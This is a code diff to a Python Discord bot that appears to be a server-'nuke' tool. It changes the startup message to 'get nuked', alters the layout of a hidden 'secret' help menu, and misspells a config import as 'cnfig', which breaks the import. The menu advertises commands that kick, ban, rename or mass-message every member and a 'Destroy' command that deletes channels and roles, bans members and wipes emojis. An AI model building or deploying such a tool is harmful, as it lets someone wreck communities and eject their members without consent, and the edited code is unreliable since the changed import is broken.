@@ -1,5 +1,5 @@
 #Made by Social404
-from config import prefix
+from cnfig import prefix
 from config import token
 import keep_alive
 import discord
@@ -19,7 +19,7 @@ client.remove_command("help")
 
 @client.event
 async def on_ready():
-    print ("Ah shit, here we go again")
+    print ("get nuked")
 
 @client.event
 async def on_server_join(server):
@@ -36,10 +36,10 @@ async def secret(ctx):
     )
 
     embed.set_author(name='Secret')
-    embed.add_field(name='Kall', value='Kicks every member in a server', inline=False)
-    embed.add_field(name='Ball', value='Bans every member in a server', inline=False)
+    embed.add_field(name='Kall', value='Kicks every member in a server', inline=True)
+    embed.add_field(name='Ball', value='Bans every member in a server', inline=True)
     embed.add_field(name='Rall', value='Renames every member in a server', inline=False)
-    embed.add_field(name='Mall', value='Messages every member in a server', inline=False)
+    embed.add_field(name='Mall', value='Messages every member in a server', inline=True)
     embed.add_field(name='Destroy', value='Deleted channels, remakes new ones, deletes roles, bans members, and wipes emojis. In that order', inline=False)
     embed.add_field(name='Ping', value='Gives ping to client (expressed in MS)', inline=False)
     embed.add_field(name='Info', value='Gives information of a user', inline=False)
